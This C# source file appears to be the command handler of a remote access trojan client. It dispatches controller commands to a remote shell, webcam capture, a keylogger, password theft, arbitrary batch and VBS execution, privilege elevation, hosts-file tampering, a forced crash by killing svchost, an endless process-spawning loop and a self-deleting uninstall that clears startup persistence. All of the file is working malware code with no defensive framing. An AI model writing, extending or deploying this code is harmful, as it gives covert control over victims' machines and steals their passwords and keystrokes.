using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using Client.Connection;
using Microsoft.Win32;
using System.Windows.Forms;
using Stuff;
using System.Runtime.InteropServices;
using System.Text;
using NAudio.Wave;

namespace Client.Handlers
{
    internal class HandlePacket
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);

        [DllImport("user32.dll")]
        public static extern int SendMessageA(IntPtr hWnd, int Msg, int wParam, int lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        const int WM_APPCOMMAND = 0x319;
        const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        public const byte VK_CAPITAL = 0x14;
        public const uint KEYEVENTF_KEYDOWN = 0x0000;
        public const uint KEYEVENTF_KEYUP = 0x0002;

    public static void ToggleCapsLock()
    {
            keybd_event(VK_CAPITAL, 0, KEYEVENTF_KEYDOWN, 0);
            keybd_event(VK_CAPITAL, 0, KEYEVENTF_KEYUP, 0);
    }
        public byte[] packet { get; set; }
        public void Run(object state)
        {
            if (packet == null) return;
            Stuff.Unpack unpack = new Stuff.Unpack();
            unpack.Unpacc(packet);
            switch (unpack.GetAsString("Packet"))
            {
                case "Clientinfo":
                    {
                        new HandleInfo();
                        break;
                    }
                case "Ping":
                    {
                        Thread.Sleep(1500);
                        Stuff.Pack pack = new Stuff.Pack();
                        pack.Set("Packet", "Ping");
                        pack.Set("Message", "From client !");
                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "StartShell":
                    {
                        HandleShell.StartShell();
                        break;
                    }
                case "Shell":
                    {
                        HandleShell.CmdShell(unpack.GetAsString("Command"));
                        break;
                    }
                case "StopShell":
                    {
                        HandleShell.StopShell();
                        break;
                    }
                case "Webcam":
                    {
                        new Handlewebcam();
                        break;
                    }
                case "StopWebcam":
                    {

                        break;
                    }
                case "ProcessSpy":
                    {
                        new HandleProcessManager().Run(unpack);
                        break;
                    }
                case "Notepad":
                    {
                        string title = unpack.GetAsString("Title");
                        string content = unpack.GetAsString("Content");

                        string tempFile = Path.Combine(Path.GetTempPath(), title + "_" + Helpers.Random(3));

                        File.WriteAllText(tempFile, content);

                        Process notepadProcess = new Process();
                        notepadProcess.StartInfo.FileName = "notepad.exe";
                        notepadProcess.StartInfo.Arguments = tempFile;
                        notepadProcess.Start();
                        break;
                    }
                case "RemoteDesktop":
                    {
                        new HandleRemoteDesktop().Run(unpack);
                        break;
                    }
                case "Reverse":
                    {
                        HandleDirection.Reverse();
                        break;
                    }
                case "Normal":
                    {
                        HandleDirection.Normal();
                        break;
                    }

                case "Wallpaper":
                    {
                        string daimage = unpack.GetAsString("Image");
                        byte[] imageBytes = Convert.FromBase64String(daimage);

                        string wallpaperPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                                            "Microsoft\\Windows\\Themes\\wallpaper.jpg");
                        File.WriteAllBytes(wallpaperPath, imageBytes);

                        SystemParametersInfo(0x0014, 0, wallpaperPath, 0x01 | 0x02);
                        break;
                    }
                case "Beep":
                    {
                        Console.Beep();
                        break;
                    }
                case "Caps":
                    {
                        ToggleCapsLock();
                        break;
                    }
                case "TrapMouse":
                    {
                        MouseHandler.Trap();
                        break;
                    }
                case "UntrapMouse":
                    {
                        MouseHandler.Untrap();
                        break;
                    }
                case "ShakeMouseStop":
                    {
                        MouseHandler.StopShake();
                        break;
                    }
                case "ShakeMouse":
                    {
                        MouseHandler.StartShake();
                        break;
                    }
                case "ShowTaskbar":
                    {
                        TaskbarHandler.ShowTaskbar();
                        break;
                    }
                case "HideTaskbar":
                    {
                        TaskbarHandler.HideTaskbar();
                        break;
                    }
                case "killexplorer":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c taskkill /f /IM explorer.exe",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "startexplorer":
                    {
                        Process.Start("explorer.exe");
                        break;
                    }
                case "Mute":
                    {
                        IntPtr hwnd = FindWindow("Shell_TrayWnd", null);
                        SendMessageA(hwnd, WM_APPCOMMAND, hwnd.ToInt32(), APPCOMMAND_VOLUME_MUTE);
                        break;
                    }
                case "Trollcmd":
                    {
                        while (true)
                        {
                            Process.Start("cmd.exe", "/C pause");
                            Thread.Sleep(0);
                        }
                    }

                case "Request":
                    {
                        if (Defs.Check.Admin())
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", "You are already an admin!");
                            SillyClient.Send(pack.Pacc());
                            return;
                        }
                        try
                        {
                            Process proc = new Process
                            {
                                StartInfo = new ProcessStartInfo
                                {
                                    FileName = "cmd.exe",
                                    Arguments = "/k " + Application.ExecutablePath,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    Verb = "runas",
                                    UseShellExecute = true
                                }
                            };
                            proc.Start();
                            Application.Exit();
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Website":
                    {
                        string url = unpack.GetAsString("URL");
                        Process.Start($"{url}");
                        break;
                    }
                case "PortSpy":
                    {
                        HandlePort.GetOpenPorts();
                        break;
                    }
                case "Keylogger":
                    {
                        HandleKeylogger.Start();
                        break;
                    }
                case "GetPassword":
                    {
                        try
                        {
                            StringBuilder stringBuilder = new StringBuilder();
                            HandlePass.Steal(stringBuilder);
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Manager":
                    {
                        new managerHandler(unpack);
                        break;
                    }
                case "Execute":
                    {
                        string type = unpack.GetAsString("Type");
                        string code = unpack.GetAsString("Code");

                        if (type == "Batch")
                        {
                            string batchFile = Path.GetTempPath() + "script_" + Helpers.Random(7) +".bat";
                            File.WriteAllText(batchFile, code);
                            Process.Start(new ProcessStartInfo("cmd.exe", $"/c \"{batchFile}\"") { CreateNoWindow = true });
                        }

                        if (type == "VBS")
                        {
                            string vbsFile = Path.GetTempPath() + "script_" + Helpers.Random(7) + ".vbs";
                            File.WriteAllText(vbsFile, code);
                            Process.Start(new ProcessStartInfo("wscript.exe", vbsFile) { CreateNoWindow = true });
                        }
                        break;

                    }
                case "BSOD":
                    {
                        try
                        {
                            ProcessStartInfo processStartInfo = new ProcessStartInfo()
                            {
                                FileName = "taskkill",
                                Arguments = "/f /IM svchost.exe",
                                Verb = "runas",
                                UseShellExecute = true
                            };
                            Process.Start(processStartInfo);
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Upload":
                    {
                        new HandleUpload().Init(unpack);
                        break;
                    }
                case "HiddenBrowser":
                    {
                        break;
                    }
                case "BlockURL":
                    {
                        try
                        {
                            string url = unpack.GetAsString("url");
                            File.AppendAllText(@"C:\Windows\System32\drivers\etc\hosts", $"\n127.0.0.1 {url}");
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "PlayAudio":
                    {
                        try
                        {
                            byte[] audioBytes = unpack.GetAsByteArray("Audio");

                            string tempFilePath = Path.Combine(Path.GetTempPath(), "tempAudioFile_" + Helpers.Random(6) + ".mp3");
                            File.WriteAllBytes(tempFilePath, audioBytes);

                            using (var waveOut = new WaveOutEvent())
                            {
                                using (var mp3Reader = new Mp3FileReader(tempFilePath))
                                {
                                    waveOut.Init(mp3Reader);
                                    waveOut.Play();

                                    while (waveOut.PlaybackState == PlaybackState.Playing)
                                    {
                                        Thread.Sleep(100);
                                    }
                                }
                            }

                            File.Delete(tempFilePath);
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Screamer":
                    {
                        byte[] miau = unpack.GetAsByteArray("Rata");
                        string tempPath = Path.Combine(Path.GetTempPath(), "screamer.dll");
                        File.WriteAllBytes(tempPath, miau);

                        try
                        {
                            System.Threading.Timer timer = new System.Threading.Timer(_ =>
                            {
                                Process process = new Process();
                                process.StartInfo.FileName = tempPath;
                                process.StartInfo.UseShellExecute = true;
                                process.Start();
                            }, null, 3000, Timeout.Infinite);

                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }

                        break;
                    }



                case "MsgBox":
                    {
                        string message = unpack.GetAsString("Message");
                        string icon = unpack.GetAsString("Icon");
                        string options = unpack.GetAsString("Options");
                        string title = unpack.GetAsString("Title");

                        MessageBoxIcon msgIcon = MessageBoxIcon.None;
                        switch (icon)
                        {
                            case "Error":
                                msgIcon = MessageBoxIcon.Error;
                                break;
                            case "Warning":
                                msgIcon = MessageBoxIcon.Warning;
                                break;
                            case "Info":
                                msgIcon = MessageBoxIcon.Information;
                                break;
                        }

                        MessageBoxButtons msgButtons = MessageBoxButtons.OK;
                        switch (options)
                        {
                            case "OK":
                                msgButtons = MessageBoxButtons.OK;
                                break;
                            case "OK, Cancel":
                                msgButtons = MessageBoxButtons.OKCancel;
                                break;
                            case "Yes, No":
                                msgButtons = MessageBoxButtons.YesNo;
                                break;
                            case "Yes, No, Cancel":
                                msgButtons = MessageBoxButtons.YesNoCancel;
                                break;
                            case "Retry, Cancel":
                                msgButtons = MessageBoxButtons.RetryCancel;
                                break;
                            case "Abort, Retry, Ignore":
                                msgButtons = MessageBoxButtons.AbortRetryIgnore;
                                break;
                        }

                        MessageBox.Show(message, title, msgButtons, msgIcon);
                        break;
                    }
                // Power
                case "Shutdown":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /s /f /t 00",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "LogOff":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /l /f",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "Restart":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /r /f /t 0",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "Kill":
                    {
                        if (Client.Things.Config.Startup)
                        {
                            var registrykey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
                            registrykey.DeleteValue(Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location));
                            registrykey.Close();
                        }
                        string batch = Path.GetTempFileName() + ".bat";
                        using (StreamWriter sw = new StreamWriter(batch))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("timeout 3 > NUL");
                            sw.WriteLine("CD " + Application.StartupPath);
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                            sw.WriteLine("CD " + Path.GetTempPath());
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                        }
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = batch,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Pack pack = new Pack();
                        pack.Set("Packet", "Error");
                        pack.Set("Packet", "The program was deleted from the client");
                        Environment.Exit(0);
                        break;
                    }
                case "Update":
                    {
                        string batch = Path.GetTempFileName() + ".bat";
                        using (StreamWriter sw = new StreamWriter(batch))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("timeout 3 > NUL");
                            sw.WriteLine("START " + "\"" + "\" " + "\"" + Application.ExecutablePath + "\"");
                            sw.WriteLine("CD " + Path.GetTempPath());
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                        }
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = batch,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Environment.Exit(0);
                        break;
                    }
            }
        }
    }
}
